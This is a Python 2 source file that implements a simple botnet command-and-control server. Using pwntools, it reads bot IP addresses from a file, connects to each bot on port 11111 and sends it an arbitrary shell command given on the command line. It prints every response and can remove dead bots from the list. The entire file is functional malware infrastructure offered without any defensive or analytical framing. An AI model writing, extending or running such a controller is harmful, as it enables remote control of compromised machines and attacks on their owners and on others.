"""Implementation of a simple Command & Control Server."""

import sys
import time
from pwn import *

LPORT = 11111
BOTS_IPS = 'botnets_ips.txt'
FORMAT = """
---
\033[1;31mBot:\033[1;0m {bot}
\033[1;34mCommand:\033[1;0m {command}
\033[1;33mResponse:\033[1;0m
{response}
"""


class C2(object):
    """Command & Control (C2) Server."""

    def __init__(self):
        """C2 constructor."""
        self.bots = []
        self.read_bots_ips()

    def read_bots_ips(self):
        """Obtain the already-discovered bots' IPs.

        Read all the IP addresses in the BOTS_IPS file
        and adds them to the `bots` list.
        """
        with open(BOTS_IPS, 'r') as bots_file:
            self.bots = [x.strip('\n') for x in bots_file.readlines()]

    def send_command(self, command):
        """Give a command to the botnet.

        Send the command `command` to the IPs in the
        `bots` list.
        """
        self.read_bots_ips()
        for bot in self.bots:
            r = remote(bot, LPORT)
            r.sendline(command)
            time.sleep(3)
            response = r.recv()
            print FORMAT.format(bot=bot, command=command, response=response)

    def remove_bot(self, dead_bot_ip):
        """Remove a bot from the botnet.

        Remove the `dead_bot_ip` from the BOTS_IPS file.
        """
        with open(BOTS_IPS, 'r') as bots_file:
            set_of_bots_ips = [x.strip('\n') for x in bots_file.readlines()]

        set_of_bots_ips.remove(dead_bot_ip)

        with open(BOTS_IPS, 'w') as bots_file:
            bots_file.write('\n'.join(set_of_bots_ips))

        self.read_bots_ips()


def main():
    """Start the C2 server."""
    if len(sys.argv) != 2:
        print 'Specify the command to be sent to the botnet as one argument enclosed by quotes.'
        sys.exit(1)

    new_C2 = C2()
    new_C2.send_command(sys.argv[1])


if __name__ == '__main__':
    main()